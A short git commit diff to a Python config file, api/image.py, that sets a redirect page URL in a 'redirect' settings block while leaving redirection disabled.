ce9ecf7d70a6ed7db075a0737d5e5ba974890f35
proX8LF <rare69963@gmail.com>
2025-02-14 08:55:17 +0100

    Update image.py

--- api/image.py
+++ api/image.py
@@ -51,7 +51,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": False, # Redirect to a webpage?
-        "page": "" # Link to the webpage to redirect to 
+        "page": " https://image-two-topaz.vercel.app" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
